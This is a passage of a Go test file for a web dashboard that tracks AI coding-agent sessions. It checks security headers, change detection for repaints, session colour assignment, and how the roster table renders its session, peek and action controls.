	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", PayloadJSON: "{}"})

	routes := map[string]func(http.ResponseWriter, *http.Request, *sql.DB, *ciCache, *peekConfig, *actionConfig){
		"/":          handleDashboard,
		"/api/state": handleState,
	}
	want := map[string]string{
		"X-Frame-Options":         "DENY",
		"X-Content-Type-Options":  "nosniff",
		"Referrer-Policy":         "no-referrer",
		"Content-Security-Policy": "frame-ancestors 'none'; base-uri 'none'; object-src 'none'",
	}
	for target, h := range routes {
		rec := httptest.NewRecorder()
		h(rec, httptest.NewRequest(http.MethodGet, target, nil), db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status=%d", target, rec.Code)
		}
		for k, v := range want {
			if got := rec.Header().Get(k); got != v {
				t.Errorf("%s: %s = %q, want %q", target, k, got, v)
			}
		}
	}

	// The error path has to carry them too. http.Error writes the response, so a
	// handler that set headers only after a successful query would ship its 500
	// unframed — which is the response an attacker can most easily provoke.
	closed, _ := openDB(filepath.Join(t.TempDir(), "closed.db"))
	closed.Close()
	for target, h := range routes {
		rec := httptest.NewRecorder()
		h(rec, httptest.NewRequest(http.MethodGet, target, nil), closed, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
		if rec.Code != http.StatusInternalServerError {
			t.Fatalf("%s: a closed DB should 500, got %d", target, rec.Code)
		}
		for k, v := range want {
			if got := rec.Header().Get(k); got != v {
				t.Errorf("%s (500): %s = %q, want %q", target, k, got, v)
			}
		}
	}
}

func TestViewSignature_IgnoresIdleButTracksEvents(t *testing.T) {
	base := dashboardData{
		Events:   []Event{{ID: 2}, {ID: 1}},
		Agents:   []Agent{{SessionID: "s1", Status: statusWorking, IdleSecs: 10, IdleSince: 100}},
		Activity: []SourceCount{{SourceApp: "myapp", Count: 2}},
	}

	// Only idle advanced (more seconds, earlier IdleSince) — signature must hold.
	idled := base
	idled.Agents = []Agent{{SessionID: "s1", Status: statusWorking, IdleSecs: 999, IdleSince: 1}}
	if viewSignature(base) != viewSignature(idled) {
		t.Error("signature changed on idle-only difference")
	}

	// A genuinely new event must move the signature.
	newEvent := base
	newEvent.Events = []Event{{ID: 3}, {ID: 2}, {ID: 1}}
	if viewSignature(base) == viewSignature(newEvent) {
		t.Error("signature unchanged after a new event")
	}

	// A status flip (e.g. agent went to "waiting for you") must move it too.
	flipped := base
	flipped.Agents = []Agent{{SessionID: "s1", Status: statusWaiting, IdleSecs: 10, IdleSince: 100}}
	if viewSignature(base) == viewSignature(flipped) {
		t.Error("signature unchanged after a status change")
	}
}

func TestSessColor(t *testing.T) {
	// Deterministic: same id -> same color across calls.
	first := sessColor("abc123")
	second := sessColor("abc123")
	if first != second {
		t.Errorf("sessColor not deterministic: %q != %q", first, second)
	}
	// Empty id -> empty string (no chip/tint).
	if got := sessColor(""); got != "" {
		t.Errorf("sessColor(\"\") = %q, want \"\"", got)
	}
	// Any non-empty id maps into the palette.
	for _, id := range []string{"a", "session-1", "7f3c9a01", "xyz", "deadbeef"} {
		if c := sessColor(id); !slices.Contains(sessPalette, c) {
			t.Errorf("sessColor(%q) = %q, not in palette", id, c)
		}
	}
}

func TestAssignSessColors(t *testing.T) {
	mkAgents := func(ids ...string) []Agent {
		out := make([]Agent, len(ids))
		for i, id := range ids {
			out[i] = Agent{SessionID: id, firstSeq: i} // firstSeq = arrival order
		}
		return out
	}

	// Distinctness: a roster no larger than the palette gets unique colors,
	// regardless of hash collisions — the greedy probe deconflicts them.
	ids := []string{"alpha", "bravo", "charlie", "delta", "echo", "foxtrot", "golf"}
	got := assignSessColors(mkAgents(ids...), nil)
	owner := map[string]string{}
	for _, id := range ids {
		c := got[id]
		if c == "" {
			t.Fatalf("no color for %q", id)
		}
		if prev, ok := owner[c]; ok {
			t.Errorf("color %s shared by %q and %q; want distinct", c, prev, id)
		}
		owner[c] = id
	}

	// Incumbents keep their color when a newer agent arrives.
	before := assignSessColors(mkAgents("alpha", "bravo", "charlie"), nil)
	after := assignSessColors(mkAgents("alpha", "bravo", "charlie", "delta"), nil)
	for _, id := range []string{"alpha", "bravo", "charlie"} {
		if before[id] != after[id] {
			t.Errorf("incumbent %q recolored on add: %s -> %s", id, before[id], after[id])
		}
	}
	if after["delta"] == "" {
		t.Error("newcomer delta got no color")
	}

	// Empty session ids are skipped (no chip/tint to render).
	withEmpty := assignSessColors(mkAgents("alpha"), []Event{{SessionID: ""}})
	if _, ok := withEmpty[""]; ok {
		t.Error("empty session id should not be assigned a color")
	}

	// A session that appears only in the events log (not on the roster) still gets
	// a color, deconflicted against the roster agents.
	mixed := assignSessColors(mkAgents("alpha", "bravo"), []Event{{SessionID: "log-only"}, {SessionID: "alpha"}})
	if mixed["log-only"] == "" {
		t.Error("events-only session got no color")
	}
	if mixed["log-only"] == mixed["alpha"] || mixed["log-only"] == mixed["bravo"] {
		t.Errorf("events-only session %s collided with a roster agent", mixed["log-only"])
	}

	// More sessions than colors: everyone still gets a palette color (collisions
	// resume past the palette, but nothing panics or goes blank).
	many := make([]string, len(sessPalette)+3)
	for i := range many {
		many[i] = fmt.Sprintf("sess-%d", i)
	}
	all := assignSessColors(mkAgents(many...), nil)
	for _, id := range many {
		if !slices.Contains(sessPalette, all[id]) {
			t.Errorf("overflow session %q got %q, not in palette", id, all[id])
		}
	}
}

func TestSessPaletteIsHex(t *testing.T) {
	re := regexp.MustCompile(`^#[0-9a-fA-F]{6}$`)
	if len(sessPalette) == 0 {
		t.Fatal("sessPalette is empty")
	}
	for _, c := range sessPalette {
		// Guards against a future non-hex token being silently blanked to
		// "ZgotmplZ" by html/template's style-attribute escaper.
		if !re.MatchString(c) {
			t.Errorf("palette entry %q is not a #rrggbb hex literal", c)
		}
	}
}

func TestHandleDashboard_SessionColors(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	// One event with a session id, one without (some hooks carry no session_id).
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "br", SessionID: "sess-abc",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: ls", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "SessionStart",
		Summary: "SessionStart", PayloadJSON: "{}"})

	// The Recent-events row tint lives in a debug-gated section.
	body := getBody(t, db, "/?debug=1")
	// Only one session is visible, so assignSessColors hits no collision and hands
	// it its hash-preferred color — i.e. exactly sessColor("sess-abc").
	want := sessColor("sess-abc")

	// A colored chip is rendered for the session.
	if !strings.Contains(body, `class="chip"`) {
		t.Errorf("expected a session chip in output:\n%s", body)
	}
	// The session's color appears (chip + row tint both derive from it).
	if !strings.Contains(body, want) {
		t.Errorf("expected session color %q in output:\n%s", want, body)
	}
	// The row is tinted via color-mix against Canvas.
	if !strings.Contains(body, "color-mix") {
		t.Errorf("expected a color-mix row tint:\n%s", body)
	}
	// The activity table carries a column headed "session" (the tmux session
	// name); the roster's own session column was folded into the controls cell.
	if !strings.Contains(body, "<th>session</th>") {
		t.Errorf("expected a session column header:\n%s", body)
	}
	// Exactly one row carries an inline tint: the session-bearing Recent-events
	// row. The empty-session row's {{ if .SessionID }} guard skips the style attr
	// entirely, and the roster chip uses a solid background (not color-mix), so
	// neither matches. This proves the empty-session row is left untinted.
	if n := strings.Count(body, `style="background: color-mix`); n != 1 {
		t.Errorf("expected exactly 1 tinted row, got %d:\n%s", n, body)
	}
}

func TestViewSignature_TracksTmuxSession(t *testing.T) {
	base := dashboardData{
		Agents:   []Agent{{SessionID: "s1", TmuxSession: "alpha", Status: statusWorking}},
		Activity: []SourceCount{{SourceApp: "myapp", TmuxSession: "alpha", Count: 2}},
	}

	// Roster row differs only by tmux session name.
	rosterDiff := base
	rosterDiff.Agents = []Agent{{SessionID: "s1", TmuxSession: "beta", Status: statusWorking}}
	if viewSignature(base) == viewSignature(rosterDiff) {
		t.Error("signature unchanged after a roster tmux-session change")
	}

	// Activity row differs only by tmux session name.
	activityDiff := base
	activityDiff.Activity = []SourceCount{{SourceApp: "myapp", TmuxSession: "beta", Count: 2}}
	if viewSignature(base) == viewSignature(activityDiff) {
		t.Error("signature unchanged after an activity tmux-session change")
	}
}

func TestViewSignature_TracksCwd(t *testing.T) {
	// The roster renders each session's cwd (the branch cell's copy target), so a
	// session that moves worktrees must repaint — otherwise the board keeps
	// handing out a stale path.
	base := dashboardData{
		Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/one", Status: statusWorking}},
	}
	moved := base
	moved.Agents = []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w/two", Status: statusWorking}}
	if viewSignature(base) == viewSignature(moved) {
		t.Error("signature unchanged after a roster cwd change")
	}
}

// The specific collision the %q in viewSignature prevents. These fields are free
// text and can contain the ":" that delimits them, so written unquoted one
// field's tail masquerades as the next field's head and two genuinely different
// rosters hash alike — a repaint that never happens, leaving a stale copy target
// on the board. Reverting %q to %s makes exactly this test fail, which the
// "some change is noticed" test above cannot do.
func TestViewSignature_DelimiterCannotBeSmuggled(t *testing.T) {
	// Branch "main:/w" + cwd "one" against branch "main" + cwd "/w:one". Both
	// concatenate to the same "…main:/w:one…" once the ":" separating branch from
	// cwd is indistinguishable from the ":" inside the data. Note the second
	// path's separator is the delimiter itself — a "/" there would NOT collide,
	// and the test would pass under %s too, i.e. prove nothing.
	a := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main:/w", Cwd: "one", Status: statusWorking}}}
	b := dashboardData{Agents: []Agent{{SessionID: "s1", Branch: "main", Cwd: "/w:one", Status: statusWorking}}}
	if viewSignature(a) == viewSignature(b) {
		t.Error("signature collides across a field boundary: a delimiter in the data is being read as the delimiter")
	}
}

func TestHandleDashboard_ShowsLastCommand(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// The session typed /git-rebase, then stopped. Its Doing is unrelated/empty, so
	// the slash command surfaces as a muted second line.
	insertEvent(db, Event{TS: now.Add(-5 * time.Minute).Format(time.RFC3339), SourceApp: "myapp", Branch: "fix-45",
		SessionID: "sess-cmd", EventType: "UserPromptSubmit", SlashCommand: "/git-rebase", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-cmd",
		EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `<div class="lastcmd" title="last slash command">↳ /git-rebase</div>`) {
		t.Errorf("expected the slash command as a muted second line in:\n%s", body)
	}
}

func TestHandleDashboard_NoLastCommandLine(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// A session that never ran a slash command renders no ↳ second line.
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-plain",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: go build", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if strings.Contains(body, `class="lastcmd"`) {
		t.Errorf("a session with no slash command must not render a lastcmd line in:\n%s", body)
	}
}

func TestHandleDashboard_DedupesLastCommandAgainstSkill(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	recent := now.Add(-2 * time.Minute).Format(time.RFC3339)
	// A skill-backed slash command: Doing is the skill name "code-review" (no slash)
	// and LastCommand is "/code-review". The ↳ line would merely duplicate line 1,
	// so it must be suppressed — while the skill still shows on line 1.
	insertEvent(db, Event{TS: now.Add(-4 * time.Minute).Format(time.RFC3339), SourceApp: "myapp", Branch: "fix-45",
		SessionID: "sess-skill", EventType: "UserPromptSubmit", SlashCommand: "/code-review", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: recent, SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-skill",
		EventType: "PreToolUse", ToolName: "Skill", Summary: "Skill: code-review", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "code-review") {
		t.Errorf("the skill should still show on line 1 in:\n%s", body)
	}
	if strings.Contains(body, "↳ /code-review") {
		t.Errorf("a skill-backed command must not duplicate as a ↳ line in:\n%s", body)
	}
}

func TestHandleDashboard_ItalicDoingWithLastCommand(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC()
	at := func(mins int) string { return now.Add(time.Duration(-mins) * time.Minute).Format(time.RFC3339) }
	// One session that ran the address-gh-review skill, typed /git-rebase, then
	// stopped. Stopped → status "waiting for you" → DoingActive false, so line 1
	// is the italic "last completed" variant; /git-rebase is distinct from
	// "/"+Doing, so the muted second line survives dedupe. The two must coexist.
	insertEvent(db, Event{TS: at(6), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "PreToolUse", ToolName: "Skill", Summary: "Skill: address-gh-review", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: at(4), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "UserPromptSubmit", SlashCommand: "/git-rebase", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: at(2), SourceApp: "myapp", Branch: "fix-45", SessionID: "sess-italic",
		EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `<em title="last completed">address-gh-review</em>`) {
		t.Errorf("expected italic last-completed line 1 in:\n%s", body)
	}
	if !strings.Contains(body, `<div class="lastcmd" title="last slash command">↳ /git-rebase</div>`) {
		t.Errorf("expected the muted slash-command second line alongside the italic line 1 in:\n%s", body)
	}
}

func TestHandleDashboard_RendersTmuxSession(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-1710", TmuxSession: "roster-colors",
		SessionID: "sess-a", EventType: "Stop", Summary: "Stop", PayloadJSON: "{}"})

	// The activity table (<th>events</th>) is debug-gated.
	body := getBody(t, db, "/?debug=1")
	for _, want := range []string{
		"roster-colors",    // the disambiguating name appears (activity table)
		"fix-1710",         // branch shown in its own column
		"<th>session</th>", // activity table's session-name column
		"<th>branch</th>",  // roster keeps a distinct branch column
		"<th>events</th>",  // activity table renders
		"<th>id</th>",      // the renamed session-id chip column
	} {
		if !strings.Contains(body, want) {
			t.Errorf("missing %q in dashboard:\n%s", want, body)
		}
	}
	// The branch is its own column, not a dimmed sub-label stacked under the name.
	if strings.Contains(body, `<span class="sub">`) {
		t.Errorf("stacked branch sub-label should be gone:\n%s", body)
	}
}

func TestDemotePendingCI(t *testing.T) {
	agents := []Agent{
		{SessionID: "needs", Status: statusNeedsYou, StatusRank: 1, CI: "pending"},
		{SessionID: "waiting", Status: statusWaiting, StatusRank: 0, CI: "pending"},
		{SessionID: "approval", Status: statusApproval, StatusRank: 1, CI: "pending"},  // a real prompt: untouched
		{SessionID: "needs-green", Status: statusNeedsYou, StatusRank: 1, CI: "green"}, // CI not pending: untouched
		{SessionID: "working", Status: statusWorking, StatusRank: 5, CI: "pending"},    // not an alert: untouched
		{SessionID: "needs-nocheck", Status: statusNeedsYou, StatusRank: 1, CI: ""},    // no CI info: untouched
	}
	demotePendingCI(agents)
	got := map[string]Agent{}
	for _, a := range agents {
		got[a.SessionID] = a
	}
	for _, id := range []string{"needs", "waiting"} {
		if a := got[id]; a.Status != statusBackground || a.StatusRank != rankBackground {
			t.Errorf("%s with pending CI should demote to %q rank %d, got %q rank %d", id, statusBackground, rankBackground, a.Status, a.StatusRank)
		}
	}
	if a := got["approval"]; a.Status != statusApproval {
		t.Errorf("a permission prompt must survive pending CI, got %q", a.Status)
	}
	if a := got["needs-green"]; a.Status != statusNeedsYou {
		t.Errorf("green CI must not demote, got %q", a.Status)
	}
	if a := got["working"]; a.Status != statusWorking {
		t.Errorf("non-alert working row must be untouched, got %q", a.Status)
	}
	if a := got["needs-nocheck"]; a.Status != statusNeedsYou {
		t.Errorf("row with no CI info must be untouched, got %q", a.Status)
	}
}

func getBody(t *testing.T, db *sql.DB, target string) string {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, target, nil)
	rec := httptest.NewRecorder()
	handleDashboard(rec, req, db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	return rec.Body.String()
}

// The peek control renders only when the feature is enabled AND the row's pane is
// live. buildDashboardData sets LiveTmux; here we assert the template gate by
// rendering the content template directly.
func TestContentTemplate_PeekControlGated(t *testing.T) {
	base := dashboardData{
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}

	render := func(d dashboardData) string {
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	on := base
	on.PeekEnabled = true
	if !strings.Contains(render(on), `data-pane="%3"`) {
		t.Error("enabled + live: expected a peek control with data-pane=%3")
	}

	off := base // PeekEnabled false
	if strings.Contains(render(off), `data-pane=`) {
		t.Error("disabled: expected no peek control")
	}
}

// The shared controls cell must exist under peek alone (merge off) — a state that
// was impossible before the session/controls columns were folded together, when
// the actions cell only rendered under --enable-merge. With peek on and merge off
// the cell renders and holds the ⤢ peek button (and no merge toggle).
func TestContentTemplate_ControlsCellRendersUnderPeekAlone(t *testing.T) {
	d := dashboardData{
		PeekEnabled:  true,
		MergeEnabled: false,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	if !strings.Contains(html, `<td class="actions" data-label="actions">`) {
		t.Fatalf("peek on, merge off: expected a controls cell to render:\n%s", html)
	}
	// The controls cell holds the peek button.
	cellStart := strings.Index(html, `<td class="actions"`)
	cell := html[cellStart : cellStart+strings.Index(html[cellStart:], "</td>")]
	if !strings.Contains(cell, `class="peek" data-pane="%3"`) {
		t.Errorf("controls cell must hold the peek button:\n%s", cell)
	}
	// No merge toggle when merge is off.
	if strings.Contains(cell, "actbtn") {
		t.Errorf("merge off: no actbtn toggle should render:\n%s", cell)
	}
	// The session column is restored, and the shared controls column is present too.
	if !strings.Contains(html, "<th>session</th>") {
		t.Errorf("session header column must render:\n%s", html)
	}
	if !strings.Contains(html, "<th>actions</th>") {
		t.Errorf("peek on: controls (actions) header column must render:\n%s", html)
	}
}

// With neither peek nor merge enabled (the default read-only layout), the shared
// controls column must not exist at all — no <th>actions</th> header and no
// <td class="actions"> body cell — so header and body column counts stay in
// lockstep. This is the fourth gating permutation; the peek-only, merge-only, and
// both cases are covered elsewhere.
func TestContentTemplate_ControlsColumnAbsentWhenNeitherEnabled(t *testing.T) {
	d := dashboardData{
		PeekEnabled:  false,
		MergeEnabled: false,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	if strings.Contains(html, "<th>actions</th>") {
		t.Errorf("neither peek nor merge: controls header column must be absent:\n%s", html)
	}
	if strings.Contains(html, `<td class="actions"`) {
		t.Errorf("neither peek nor merge: controls body cell must be absent:\n%s", html)
	}
	// The session column is independent of the controls column, so it renders even
	// when neither peek nor merge is on.
	if !strings.Contains(html, "<th>session</th>") {
		t.Errorf("session header column must render regardless of controls gating:\n%s", html)
	}
	if !strings.Contains(html, `<td class="tmux" data-label="session"`) {
		t.Errorf("session body cell must render regardless of controls gating:\n%s", html)
	}
}

// #87 dropped the desktop session column, but the phone card has no column to
// fall back on, so the tmux session name rides along as a muted .tmuxname suffix
// inside the roster branch cell (CSS hides it on the desktop table, reveals it on
// the ≤640px card). Assert the span carries the session name when present and is
// absent when there is no tmux session.
func TestContentTemplate_TmuxNameRidesAlongInBranchCell(t *testing.T) {
	render := func(session string) string {
		d := dashboardData{Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			Branch: "fix-85", TmuxSession: session,
		}}}
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	withName := render("clodhopper-fix-85")
	// The span lives inside the branch cell and carries the tmux session name.
	branchStart := strings.Index(withName, `<td class="branch"`)
	if branchStart < 0 {
		t.Fatalf("no branch cell rendered:\n%s", withName)
	}
	branchCell := withName[branchStart : branchStart+strings.Index(withName[branchStart:], "</td>")]
	if !strings.Contains(branchCell, `class="tmuxname"`) {
		t.Errorf("branch cell must carry a .tmuxname suffix span:\n%s", branchCell)
	}
	if !strings.Contains(branchCell, "clodhopper-fix-85") {
		t.Errorf("branch cell must carry the tmux session name:\n%s", branchCell)
	}
	// A visually-hidden cue tells screen readers this is a session name.
	if !strings.Contains(branchCell, `<span class="ck-sr">session </span>`) {
		t.Errorf("branch cell must carry a ck-sr \"session \" prefix:\n%s", branchCell)
	}
	// The inert data-label (only td::before consumes it) must be gone.
	if strings.Contains(branchCell, `data-label="session"`) {
		t.Errorf("tmuxname span must not carry an inert data-label:\n%s", branchCell)
	}

	// No tmux session → no dangling empty span.
	if got := render(""); strings.Contains(got, "tmuxname") {
		t.Errorf("no tmux session: .tmuxname span must not render:\n%s", got)
	}
}

// The desktop roster restores the tmux session name as its own last column (a
// flexible, width-less <col> that soaks up the leftover table width). It renders
// independently of peek/merge, carries the full name in a title for hover, and
// falls back to "—" when a row has no tmux session.
func TestContentTemplate_SessionColumnRendersOnDesktop(t *testing.T) {
	render := func(session string) string {
		d := dashboardData{Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			Branch: "fix-87", TmuxSession: session,
		}}}
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	// With a name: the header column and the body cell (carrying the name + title)
	// both render, with no peek/merge enabled.
	withName := render("clodhopper-fix-87")
	if !strings.Contains(withName, "<th>session</th>") {
		t.Errorf("session header column must render on the desktop roster:\n%s", withName)
	}
	if !strings.Contains(withName, `<td class="tmux" data-label="session" title="clodhopper-fix-87">clodhopper-fix-87</td>`) {
		t.Errorf("session cell must carry the tmux name and a hover title:\n%s", withName)
	}

	// No tmux session: the cell still renders, showing the "—" fallback and no title.
	blank := render("")
	if !strings.Contains(blank, `<td class="tmux" data-label="session">—</td>`) {
		t.Errorf("no tmux session: session cell must show the — fallback:\n%s", blank)
	}
}

// The shared controls cell wraps its buttons (peek + merge toggle) in an inner
// .ctrlwrap flex wrapper, NOT directly on the <td>. A display:flex <td> drops out
// of the table's border-collapse and paints its own bottom border as an orphaned
// bar under the controls column (worse on hover). Keeping the <td> a plain cell —
// with the flex on .ctrlwrap — collapses the border like every other column, so
// this guards against a regression back to flex-on-<td>.
func TestContentTemplate_ControlsCellUsesInnerFlexWrapper(t *testing.T) {
	var buf bytes.Buffer
	d := dashboardData{
		PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", LiveTmux: true,
		}},
	}
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	// The controls cell wraps its buttons, so the <td> itself carries no flex.
	if !strings.Contains(html, `<td class="actions" data-label="actions"><div class="ctrlwrap">`) {
		t.Errorf("controls cell must wrap its content in <div class=\"ctrlwrap\">:\n%s", html)
	}
	// The peek button must be inside that wrapper (before the wrapper closes).
	i := strings.Index(html, `<div class="ctrlwrap">`)
	j := strings.Index(html, `</div></td>`)
	if i < 0 || j < 0 || j < i || !strings.Contains(html[i:j], `class="peek"`) {
		t.Errorf("peek button must render inside the .ctrlwrap wrapper:\n%s", html)
	}
}

// The session-action buttons (monitor ci / + watcher) are gated on pane
// PRESENCE, not on --pane-peek: handleAction accepts monitor-ci/new-monitor
// whenever --enable-merge is on, so the buttons must render under merge alone
// (peek off) for any row that recorded a pane. Gating on LiveTmux (which is only
// populated when peek is enabled) would hide buttons the backend would accept.
func TestContentTemplate_SessionActionsGatedOnPaneNotPeek(t *testing.T) {
	render := func(d dashboardData) string {
		var buf bytes.Buffer
		if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
			t.Fatal(err)
		}
		return buf.String()
	}

	// Merge on, peek OFF, a row that has a pane but LiveTmux false (as it would be
	// when the peek liveness cache never ran because peek is disabled).
	withPane := dashboardData{
		MergeEnabled: true,
		PeekEnabled:  false,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Branch: "feature", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", HasPane: true, LiveTmux: false,
		}},
	}
	html := render(withPane)
	if !strings.Contains(html, `data-action="monitor-ci"`) {
		t.Errorf("merge on + pane present: expected the monitor-ci button:\n%s", html)
	}
	if !strings.Contains(html, `data-action="new-monitor"`) {
		t.Errorf("merge on + pane present: expected the + watcher button:\n%s", html)
	}
	// The peek control itself stays gated on PeekEnabled — no ⤢ when peek is off.
	if strings.Contains(html, `class="peek"`) {
		t.Errorf("peek off: peek control must not render:\n%s", html)
	}

	// A row with no pane has nothing live to target, so the session buttons drop
	// even under merge; the PR form still renders.
	noPane := withPane
	noPane.Agents = []Agent{{
		SessionID: "s2", SourceApp: "app", Branch: "feature", Status: statusWaiting,
		HasPane: false,
	}}
	html = render(noPane)
	if strings.Contains(html, `data-action="monitor-ci"`) {
		t.Errorf("no pane: session-action buttons must not render:\n%s", html)
	}
	if !strings.Contains(html, `class="pract prrun"`) {
		t.Errorf("no pane: PR form should still render:\n%s", html)
	}
}

// The session + PR actions are hidden behind a disclosure by default: the roster
// cell shows only a "⋯ actions" toggle, and the clusters live in a separate
// panel row that is `hidden` until the toggle is pressed. This mirrors the design
// (Roster.jsx), where the always-visible form would otherwise multiply row height.
func TestContentTemplate_ActionsHiddenBehindDisclosure(t *testing.T) {
	d := dashboardData{
		MergeEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Branch: "feature", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", HasPane: true,
		}},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	// The actions cell is just the toggle, collapsed by default.
	if !strings.Contains(html, `class="actbtn" data-actions="s1" aria-expanded="false"`) {
		t.Errorf("expected a collapsed ⋯ actions toggle in the actions cell:\n%s", html)
	}
	// The panel row exists and is hidden until the toggle opens it.
	if !strings.Contains(html, `<tr class="actrow" hidden id="actrow-s1" data-actions-row="s1">`) {
		t.Errorf("expected a hidden actions panel row:\n%s", html)
	}
	// The toggle is linked to the panel it controls.
	if !strings.Contains(html, `aria-controls="actrow-s1"`) {
		t.Errorf("expected the toggle to reference its panel via aria-controls:\n%s", html)
	}

	// The form must NOT sit in the visible actions <td> — it belongs in the hidden
	// panel row. Isolate the cell and assert the clusters are absent from it.
	cellStart := strings.Index(html, `<td class="actions"`)
	if cellStart == -1 {
		t.Fatalf("no actions cell rendered:\n%s", html)
	}
	cell := html[cellStart : cellStart+strings.Index(html[cellStart:], "</td>")]
	if strings.Contains(cell, "prrun") || strings.Contains(cell, "monitor-ci") {
		t.Errorf("actions must be hidden behind the toggle, not inline in the cell:\n%s", cell)
	}
	// And they DO live inside the hidden panel row.
	rowStart := strings.Index(html, `<tr class="actrow" hidden`)
	if rowStart == -1 {
		t.Fatalf("no actions panel row rendered:\n%s", html)
	}
	panel := html[rowStart:]
	if !strings.Contains(panel, `class="pract prrun"`) || !strings.Contains(panel, `data-action="monitor-ci"`) {
		t.Errorf("PR form + session buttons must render inside the hidden panel row:\n%s", panel)
	}
}

// With peek AND merge both on for a live pane, a row emits three consecutive
// sibling rows: the main roster row, its panerow, then its actrow. The disclosure
// JS (mainRowOf/closeOtherPanels) walks these siblings to enforce that peek and
// actions are mutually exclusive per row, so their ordering and adjacency is a
// load-bearing contract — reordering or inserting a row between them would break
// mutual exclusion silently, with no other test rendering peek + merge together.
func TestContentTemplate_PanelRowsAdjacentToMainRow(t *testing.T) {
	d := dashboardData{
		MergeEnabled: true, PeekEnabled: true,
		Agents: []Agent{{
			SessionID: "s1", SourceApp: "app", Branch: "feature", Status: statusWaiting,
			TmuxSession: "sess", TmuxPane: "%3", HasPane: true, LiveTmux: true,
		}},
	}
	var buf bytes.Buffer
	if err := dashboardTmpl.ExecuteTemplate(&buf, "content", d); err != nil {
		t.Fatal(err)
	}
	html := buf.String()

	iToggle := strings.Index(html, `data-actions="s1"`) // in the main row's actions cell
	paneOpen := `<tr class="panerow"`
	actOpen := `<tr class="actrow"`
	iPane := strings.Index(html, paneOpen)
	iAct := strings.Index(html, actOpen)
	if iToggle == -1 || iPane == -1 || iAct == -1 {
		t.Fatalf("expected main-row toggle, panerow, and actrow all rendered:\n%s", html)
	}
